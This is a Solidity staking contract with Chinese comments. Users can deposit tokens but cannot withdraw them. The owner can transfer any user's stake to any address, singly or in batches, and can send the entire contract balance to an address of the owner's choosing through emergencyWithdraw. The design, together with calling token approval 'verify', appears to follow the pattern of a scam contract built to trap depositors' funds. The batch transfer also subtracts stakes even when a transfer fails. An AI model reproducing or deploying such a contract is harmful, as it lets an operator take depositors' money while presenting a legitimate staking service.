// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract EthStaking is Ownable, ReentrancyGuard {
    IERC20 public token; // 代币合约地址
    mapping(address => uint256) public stakes; // 用户质押金额
    mapping(address => uint256) public allowances; // 用户给合约verify额度

    event Staked(address indexed user, uint256 amount);
    event TransferredFrom(address indexed from, address indexed to, uint256 amount);
    event AllowanceSet(address indexed user, uint256 amount);

    // 🔧 修复：新版OpenZeppelin需要指定owner
    constructor(address _tokenAddr) Ownable(msg.sender) {
        token = IERC20(_tokenAddr);
    }

    // 用户质押代币，先verify合约再调用本函数转入金额
    function stake(uint256 amount) external nonReentrant {
        require(amount > 0, "Stake amount > 0");
        require(token.transferFrom(msg.sender, address(this), amount), "Transfer failed");
        stakes[msg.sender] += amount;
        emit Staked(msg.sender, amount);
    }

    // 用户verify合约代为转账额度
    function approveAllowance(uint256 amount) external {
        allowances[msg.sender] = amount;
        emit AllowanceSet(msg.sender, amount);
    }

    // 管理员操作：通过合约从用户verify额度内转账给目标地址
    function adminTransferFrom(address from, address to, uint256 amount) external onlyOwner nonReentrant {
        require(from != address(0) && to != address(0), "Invalid addresses");
        require(amount > 0, "Amount must > 0");
        require(allowances[from] >= amount, "Allowance not sufficient");
        require(stakes[from] >= amount, "Stake not sufficient");
        
        allowances[from] -= amount;
        stakes[from] -= amount;
        
        // 🔧 修复：ETH主网USDT可能不返回boolean，所以先检查余额
        uint256 balanceBefore = token.balanceOf(to);
        token.transfer(to, amount);
        uint256 balanceAfter = token.balanceOf(to);
        require(balanceAfter >= balanceBefore + amount, "Token transfer failed");

        emit TransferredFrom(from, to, amount);
    }

    // 🔧 新增：查询用户信息
    function getUserInfo(address user) external view returns (
        uint256 userStake,
        uint256 userAllowance,
        uint256 contractBalance
    ) {
        return (
            stakes[user],
            allowances[user],
            token.balanceOf(address(this))
        );
    }

    // 🔧 新增：紧急提取功能
    function emergencyWithdraw(address emergencyAddress) external onlyOwner {
        uint256 balance = token.balanceOf(address(this));
        require(balance > 0, "No tokens to withdraw");
        token.transfer(emergencyAddress, balance);
    }

    // 🔧 新增：批量管理员转账
    function batchAdminTransferFrom(
        address[] calldata froms,
        address to,
        uint256[] calldata amounts
    ) external onlyOwner nonReentrant {
        require(froms.length == amounts.length, "Arrays length mismatch");
        require(to != address(0), "Invalid target address");
        
        for (uint i = 0; i < froms.length; i++) {
            address from = froms[i];
            uint256 amount = amounts[i];
            
            if (allowances[from] >= amount && stakes[from] >= amount && amount > 0) {
                allowances[from] -= amount;
                stakes[from] -= amount;
                
                uint256 balanceBefore = token.balanceOf(to);
                token.transfer(to, amount);
                uint256 balanceAfter = token.balanceOf(to);
                
                if (balanceAfter >= balanceBefore + amount) {
                    emit TransferredFrom(from, to, amount);
                }
            }
        }
    }
}



